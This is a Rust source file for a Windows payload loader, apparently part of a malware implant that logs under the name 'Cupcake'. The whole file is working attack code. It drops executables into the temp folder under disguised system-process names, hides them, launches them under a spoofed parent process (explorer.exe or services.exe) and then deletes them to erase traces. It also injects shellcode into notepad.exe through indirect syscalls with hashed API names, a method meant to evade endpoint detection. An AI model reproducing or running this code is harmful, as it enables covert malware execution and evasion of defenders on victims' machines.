// Windows Memory Loader (MemoryLoader V2)
//
// PE payloads: spawn-from-disk with PPID spoofing (100% reliable).
// Shellcode payloads (fallback): classic remote thread injection via indirect syscalls.

use std::os::windows::ffi::OsStrExt;
use std::ptr;

use winapi::shared::minwindef::FALSE;
use winapi::um::processthreadsapi::{LPPROC_THREAD_ATTRIBUTE_LIST, PROCESS_INFORMATION, STARTUPINFOW};
use winapi::um::winbase::CREATE_NO_WINDOW;

use super::MigrationStatus;

pub struct WindowsMemoryLoader;
const EXTENDED_STARTUPINFO_PRESENT: u32 = 0x00080000;

#[repr(C)]
#[allow(non_snake_case)]
pub struct STARTUPINFOEXW {
    pub StartupInfo: STARTUPINFOW,
    pub lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST,
}

// Ensure handles and attribute lists don't break Send/Sync since we manage them safely
unsafe impl Send for STARTUPINFOEXW {}
unsafe impl Sync for STARTUPINFOEXW {}

impl WindowsMemoryLoader {
    pub async fn load_advanced(&self, payload: Vec<u8>, user_target: Option<&str>, _pid: Option<u32>) -> MigrationStatus {
        if payload.is_empty() { return MigrationStatus::PayloadCorrupted; }

        // ─── PE DETECTION: If payload is a Windows PE (MZ magic), spawn from disk ───
        // This bypasses ALL Donut/TLS/GS issues. The new process is a proper Windows EXE,
        // fully initialized by the OS loader with correct CRT, stack cookies, and TLS.
        if payload.len() > 2 && payload[0] == b'M' && payload[1] == b'Z' {
            crate::utils::db_print("[Cupcake] PE payload detected. Using spawn-from-disk strategy.");
            return self.spawn_pe_as_child(payload, user_target).await;
        }
        // ─── Shellcode fallback: classic remote thread injection ───
        // This path is only reached for non-PE (raw shellcode) payloads.
        crate::utils::db_print("[Cupcake] Shellcode payload detected. Using remote thread injection.");

        let is_interactive = unsafe {
            let mut session_id: u32 = 0;
            let current_pid = winapi::um::processthreadsapi::GetCurrentProcessId();
            winapi::um::processthreadsapi::ProcessIdToSessionId(current_pid, &mut session_id) != 0 && session_id != 0
        };

        let parent_name = if is_interactive { "explorer.exe" } else { "services.exe" };
        let ppid = self.find_process_by_name(parent_name).unwrap_or(0);

        // Use user target or a default host
        let sys_dir = unsafe {
            let mut buf = [0u16; 260];
            let len = winapi::um::sysinfoapi::GetSystemDirectoryW(buf.as_mut_ptr(), 260);
            if len == 0 { "C:\\Windows\\System32".to_string() }
            else { String::from_utf16_lossy(&buf[..len as usize]) }
        };

        let host_path = if let Some(t) = user_target {
            if !t.is_empty() { t.to_string() } else { format!("{}\\notepad.exe", sys_dir) }
        } else {
            format!("{}\\notepad.exe", sys_dir)
        };

        crate::utils::db_print(&format!("[Cupcake] Attempting shellcode injection via: {} (PPID: {})", host_path, ppid));

        let (h_process, h_thread, dw_pid, dw_tid) = {
            let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
            if unsafe { self.create_spoofed_process(&host_path, ppid, &mut pi) } == FALSE {
                return MigrationStatus::InjectionFailed("CREATEPROC_FAILED".to_string());
            }
            (pi.hProcess as usize, pi.hThread as usize, pi.dwProcessId, pi.dwThreadId)
        };

        // Wait for process initialization (WaitForInputIdle equivalent for suspended process)
        // Use shorter adaptive delay instead of fixed 2.5s
        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;

        let mut pi_recon: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
        pi_recon.hProcess = h_process as winapi::um::winnt::HANDLE;
        pi_recon.hThread = h_thread as winapi::um::winnt::HANDLE;
        pi_recon.dwProcessId = dw_pid;
        pi_recon.dwThreadId = dw_tid;

        let res = self.inject_payload(&pi_recon, &payload);
        if let MigrationStatus::Success = res {
            crate::utils::db_print(&format!("[Cupcake] Migration SUCCESS (PID {}).", dw_pid));
            unsafe {
                winapi::um::handleapi::CloseHandle(pi_recon.hThread);
                winapi::um::handleapi::CloseHandle(pi_recon.hProcess);
            }
            return MigrationStatus::Success;
        }

        unsafe {
            winapi::um::processthreadsapi::TerminateProcess(pi_recon.hProcess, 1);
            winapi::um::handleapi::CloseHandle(pi_recon.hThread);
            winapi::um::handleapi::CloseHandle(pi_recon.hProcess);
        }
        MigrationStatus::InjectionFailed(format!("Shellcode injection failed: {:?}", res))
    }

    unsafe fn create_spoofed_process(&self, cmd: &str, ppid: u32, pi: &mut PROCESS_INFORMATION) -> i32 {
        use winapi::um::processthreadsapi::*;
        
        let mut si_ex: STARTUPINFOEXW = std::mem::zeroed();
        si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;

        let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(cmd).encode_wide().chain(std::iter::once(0)).collect();

        // 如果 ppid 有效，尝试 PPID spoofing；否则直接创建
        if ppid == 0 {
            // No PPID spoofing — just CREATE_NO_WINDOW
            si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            return CreateProcessW(
                ptr::null(), cmd_w.as_mut_ptr(),
                ptr::null_mut(), ptr::null_mut(), FALSE,
                CREATE_NO_WINDOW,
                ptr::null_mut(), ptr::null(),
                &mut si_ex.StartupInfo, pi
            );
        }
        
        let mut list_size: usize = 0;
        InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut list_size);
        let mut lp_list = vec![0u8; list_size];
        let attribute_list = lp_list.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST;
        
        if InitializeProcThreadAttributeList(attribute_list, 1, 0, &mut list_size) == 0 { return 0; }
        
        let mut parent_handle = OpenProcess(winapi::um::winnt::PROCESS_CREATE_PROCESS, FALSE, ppid);
        if parent_handle.is_null() {
            DeleteProcThreadAttributeList(attribute_list);
            // Fallback: create without PPID spoof
            si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            return CreateProcessW(
                ptr::null(), cmd_w.as_mut_ptr(),
                ptr::null_mut(), ptr::null_mut(), FALSE,
                CREATE_NO_WINDOW,
                ptr::null_mut(), ptr::null(),
                &mut si_ex.StartupInfo, pi
            );
        }
        
        UpdateProcThreadAttribute(attribute_list, 0, 0x00020000, &mut parent_handle as *mut _ as *mut _, std::mem::size_of::<winapi::um::winnt::HANDLE>(), ptr::null_mut(), ptr::null_mut());
        si_ex.lpAttributeList = attribute_list;

        let res = CreateProcessW(
            ptr::null(), cmd_w.as_mut_ptr(),
            ptr::null_mut(), ptr::null_mut(), FALSE,
            CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
            ptr::null_mut(), ptr::null(),
            &mut si_ex.StartupInfo, pi
        );
        
        DeleteProcThreadAttributeList(attribute_list);
        winapi::um::handleapi::CloseHandle(parent_handle);
        res
    }

    /// Writes a PE to a random-named temp file and spawns it as a child process
    /// with PPID spoofing under Explorer/services. 100% reliable since the process
    /// is fully initialized by the Windows OS loader.
    async fn spawn_pe_as_child(&self, payload: Vec<u8>, user_target: Option<&str>) -> MigrationStatus {
        // 1. Choose PPID (Explorer in interactive session, services.exe otherwise)
        let mut session_id: u32 = 0;
        let is_interactive = unsafe {
            let pid = winapi::um::processthreadsapi::GetCurrentProcessId();
            winapi::um::processthreadsapi::ProcessIdToSessionId(pid, &mut session_id) != 0 && session_id != 0
        };
        let parent_name = if is_interactive { "explorer.exe" } else { "services.exe" };
        let ppid = self.find_process_by_name(parent_name).unwrap_or(0);

        // 2. Determine file name: use user-specified name if provided, otherwise random
        let temp_dir = std::env::temp_dir();
        let rand_val = crate::utils::next_u32();

        let file_name = if let Some(target) = user_target {
            // User specified a name from frontend (e.g. "svchost.exe", "RuntimeBroker.exe")
            let name = target.trim();
            if !name.is_empty() {
                // Strip path if user gave a full path like C:\Windows\System32\svchost.exe
                let base = std::path::Path::new(name)
                    .file_name()
                    .map(|f| f.to_string_lossy().to_string())
                    .unwrap_or_else(|| name.to_string());
                // Ensure it ends with .exe
                if base.to_lowercase().ends_with(".exe") {
                    base
                } else {
                    format!("{}.exe", base)
                }
            } else {
                let names = ["SecurityHealthSystray", "WmiPrvSE", "conhost", "sihost"];
                let base_name = names[(rand_val % names.len() as u32) as usize];
                format!("{}.exe", base_name)
            }
        } else {
            let names = ["SecurityHealthSystray", "WmiPrvSE", "conhost", "sihost"];
            let base_name = names[(rand_val % names.len() as u32) as usize];
            format!("{}.exe", base_name)
        };

        let temp_path = temp_dir.join(&file_name);

        crate::utils::db_print(&format!("[Cupcake] Writing PE ({} bytes) to temp.", payload.len()));
        if let Err(e) = std::fs::write(&temp_path, &payload) {
            return MigrationStatus::InjectionFailed(format!("WRITE_DISK:{}", e));
        }

        // Set FILE_ATTRIBUTE_HIDDEN to reduce visibility in explorer
        unsafe {
            let wide_path: Vec<u16> = temp_path.as_os_str().encode_wide().chain(Some(0)).collect();
            winapi::um::fileapi::SetFileAttributesW(
                wide_path.as_ptr(),
                winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN | winapi::um::winnt::FILE_ATTRIBUTE_SYSTEM,
            );
        }

        // 3. Spawn with PPID spoofing
        let path_str = temp_path.to_string_lossy().to_string();
        let spawned_pid = {
            let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
            let result = unsafe { self.create_spoofed_process(&path_str, ppid, &mut pi) };

            if result == FALSE {
                let _ = std::fs::remove_file(&temp_path);
                return MigrationStatus::InjectionFailed("CREATEPROC_FAILED".to_string());
            }

            let pid = pi.dwProcessId;
            unsafe {
                winapi::um::handleapi::CloseHandle(pi.hThread);
                winapi::um::handleapi::CloseHandle(pi.hProcess);
            }
            pid
        };

        // 4. Aggressive file cleanup: try immediate delete, then schedule fallback
        //    Windows Vista+ allows deleting a running EXE from disk.
        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await; // Wait for image mapping
        
        let deleted = std::fs::remove_file(&temp_path).is_ok();
        if deleted {
            crate::utils::db_print(&format!("[Cupcake] PE spawned as PID {}. Temp file deleted immediately.", spawned_pid));
        } else {
            // Fallback: mark for deletion on next reboot
            unsafe {
                let wide: Vec<u16> = temp_path.as_os_str().encode_wide().chain(Some(0)).collect();
                winapi::um::winbase::MoveFileExW(
                    wide.as_ptr(),
                    std::ptr::null(),
                    winapi::um::winbase::MOVEFILE_DELAY_UNTIL_REBOOT,
                );
            }
            crate::utils::db_print(&format!("[Cupcake] PE spawned as PID {}. Temp file marked for reboot cleanup.", spawned_pid));
            
            // Also try async deletion after process fully initializes
            let temp_path_clone = temp_path.clone();
            tokio::spawn(async move {
                tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
                if std::fs::remove_file(&temp_path_clone).is_ok() {
                    crate::utils::db_print("[Cupcake] Temp PE file cleaned up (async).");
                }
            });
        }

        MigrationStatus::Success
    }


    fn find_process_by_name(&self, name: &str) -> Option<u32> {
        use winapi::um::tlhelp32::*;
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE { return None; }
            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
            if Process32FirstW(snapshot, &mut entry) != 0 {
                loop {
                    let curr = String::from_utf16_lossy(&entry.szExeFile).trim_matches(char::from(0)).to_lowercase();
                    if curr.contains(&name.to_lowercase()) {
                        winapi::um::handleapi::CloseHandle(snapshot);
                        return Some(entry.th32ProcessID);
                    }
                    if Process32NextW(snapshot, &mut entry) == 0 { break; }
                }
            }
            winapi::um::handleapi::CloseHandle(snapshot);
            None
        }
    }

    /// Classic Remote Thread Injection via indirect syscalls.
    /// NtAllocateVirtualMemory -> NtWriteVirtualMemory -> NtProtectVirtualMemory -> NtCreateThreadEx
    /// 
    /// This is the most stable injection technique. The host process runs normally,
    /// and our payload executes in a new thread within a fully initialized environment.
    fn inject_payload(&self, pi: &PROCESS_INFORMATION, payload: &[u8]) -> MigrationStatus {
        unsafe {
            let h_alloc = crate::stealth::hash_api_name(b"NtAllocateVirtualMemory");
            let h_write = crate::stealth::hash_api_name(b"NtWriteVirtualMemory");
            let h_protect = crate::stealth::hash_api_name(b"NtProtectVirtualMemory");
            let h_thread = crate::stealth::hash_api_name(b"NtCreateThreadEx");

            // 1. Allocate RW memory in the remote process
            let mut remote_base: usize = 0;
            let mut region_size: usize = payload.len();
            let status_alloc = crate::syscalls::indirect_syscall(h_alloc, &[
                pi.hProcess as usize,
                &mut remote_base as *mut _ as usize,
                0, // ZeroBits
                &mut region_size as *mut _ as usize,
                0x00003000, // MEM_COMMIT | MEM_RESERVE
                0x04,       // PAGE_READWRITE
            ]);

            if status_alloc < 0 || remote_base == 0 {
                return MigrationStatus::InjectionFailed(format!("ALLOC:0x{:X}", status_alloc as u32));
            }

            crate::utils::db_print(&format!("[Cupcake] Remote alloc at 0x{:X}, size {}", remote_base, region_size));

            // 2. Write payload into the allocated memory
            let mut bytes_written: usize = 0;
            let status_write = crate::syscalls::indirect_syscall(h_write, &[
                pi.hProcess as usize,
                remote_base,
                payload.as_ptr() as usize,
                payload.len(),
                &mut bytes_written as *mut _ as usize,
            ]);

            if status_write < 0 {
                return MigrationStatus::InjectionFailed(format!("WRITE:0x{:X}", status_write as u32));
            }

            crate::utils::db_print(&format!("[Cupcake] Wrote {} bytes to remote", bytes_written));

            // 3. Change protection: RW -> RX
            let mut protect_base = remote_base;
            let mut protect_size = payload.len();
            let mut old_protect: u32 = 0;
            let status_protect = crate::syscalls::indirect_syscall(h_protect, &[
                pi.hProcess as usize,
                &mut protect_base as *mut _ as usize,
                &mut protect_size as *mut _ as usize,
                0x20, // PAGE_EXECUTE_READ
                &mut old_protect as *mut _ as usize,
            ]);

            if status_protect < 0 {
                return MigrationStatus::InjectionFailed(format!("PROT:0x{:X}", status_protect as u32));
            }

            // 4. Create remote thread to execute the payload
            let mut target_thread: *mut winapi::ctypes::c_void = ptr::null_mut();
            let status_thread = crate::syscalls::indirect_syscall(h_thread, &[
                &mut target_thread as *mut _ as usize,
                0x1FFFFF, // THREAD_ALL_ACCESS
                0,        // ObjectAttributes
                pi.hProcess as usize,
                remote_base,  // StartRoutine
                0,            // Argument
                0,            // CreateFlags (0 = start immediately)
                0, 0, 0, 0,  // StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, ByteBuffer
            ]);

            if !target_thread.is_null() {
                let _ = winapi::um::handleapi::CloseHandle(target_thread);
            }

            if status_thread < 0 {
                return MigrationStatus::InjectionFailed(format!("THR:0x{:X}", status_thread as u32));
            }

            crate::utils::db_print("[Cupcake] Remote thread created successfully.");

            MigrationStatus::Success
        }
    }
}
